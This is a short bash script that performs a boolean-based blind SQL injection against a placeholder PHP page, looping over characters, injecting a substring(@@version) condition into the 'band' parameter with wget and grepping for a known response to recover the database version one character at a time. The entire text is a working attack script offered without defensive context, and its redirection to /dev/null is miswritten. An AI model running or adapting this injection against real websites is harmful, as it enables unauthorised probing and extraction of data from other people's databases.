#!/bin/bash

charset=`echo {0..9} {A..Z} \. \: \, \; \- \_ \@`

export URL="http://VulnerableLocation/banddetails.php"
export truestring="We worked with them in the past."

for i in $charset
do
    wget "$URL?band=the offspring' and substring(@@version,1,1)='$i" -q -O - | grep "$truestring" & /dev/null
    if [ "$?" == "0" ]
    then
        echo Character found: $i
        break
    fi
done
